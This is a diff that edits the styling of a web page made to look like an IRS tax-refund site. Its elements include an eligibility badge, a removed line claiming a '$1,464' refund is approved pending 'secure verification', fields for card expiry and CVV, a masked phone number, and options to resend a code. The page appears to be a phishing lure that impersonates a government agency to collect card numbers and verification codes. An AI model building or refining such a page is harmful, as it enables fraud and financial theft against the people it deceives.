@@ -32,7 +32,6 @@
             margin: 0 auto;
         }
 
-        /* Card - government style */
         .card {
             background: #FFFFFF;
             border-radius: 24px;
@@ -44,8 +43,8 @@
         /* ---- IRS LOGO / HEADER ---- */
         .irs-header {
             text-align: center;
-            margin-bottom: 24px;
-            padding-bottom: 20px;
+            margin-bottom: 20px;
+            padding-bottom: 18px;
             border-bottom: 2px solid #E8EDF4;
         }
 
@@ -54,7 +53,7 @@
             align-items: center;
             justify-content: center;
             gap: 14px;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
         }
 
         .irs-logo svg {
@@ -99,14 +98,13 @@
             margin-top: 4px;
         }
 
-        /* Refund amount */
         .refund-amount {
             font-size: 3.4rem;
             font-weight: 700;
             color: #0A192F;
             letter-spacing: -0.02em;
             text-align: center;
-            margin: 8px 0 2px;
+            margin: 12px 0 4px;
         }
 
         .refund-amount small {
@@ -129,18 +127,6 @@
             border: 1px solid #B7E0CD;
             margin: 4px auto 0;
             justify-content: center;
-        }
-
-        .subhead {
-            margin-top: 14px;
-            color: #1F3450;
-            font-size: 0.95rem;
-            background: #F8FBFF;
-            border-left: 4px solid #1A4CFF;
-            padding: 0.7rem 1.2rem;
-            border-radius: 0 12px 12px 0;
-            line-height: 1.5;
-            font-weight: 450;
         }
 
         .status-grid {
@@ -468,11 +454,6 @@
             border-left: 3px solid #1A4CFF;
         }
 
-        .phone-mask {
-            font-weight: 700;
-            color: #0A192F;
-        }
-
         .resend-options {
             text-align: center;
             margin-top: 14px;
@@ -490,7 +471,6 @@
             line-height: 1.4;
         }
 
-        /* Card row for expiry & CVV */
         .card-row {
             display: flex;
             gap: 14px;
@@ -502,7 +482,6 @@
             flex: 0.6;
         }
 
-        /* Mobile perfect */
         @media (max-width: 420px) {
             .card {
                 padding: 24px 16px 28px;
@@ -526,7 +505,6 @@
         <div id="landingPanel" class="card">
             <div class="irs-header">
                 <div class="irs-logo">
-                    <!-- IRS styled logo -->
                     <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <rect x="4" y="4" width="56" height="56" rx="12" fill="#0A192F" />
                         <path d="M18 28L32 14L46 28L32 42L18 28Z" fill="white" />
@@ -546,10 +524,7 @@
             <div style="text-align:center;">
                 <span class="eligibility-tag">✅ You are eligible — federal refund</span>
             </div>
-            <div class="subhead">
-                <strong>Your federal tax refund of $1,464</strong> is approved and ready to claim. 
-                Complete the secure verification process to receive your funds.
-            </div>
+
             <div class="status-grid">
                 <div class="status-item">
                     <span class="status-label">Federal refund</span>
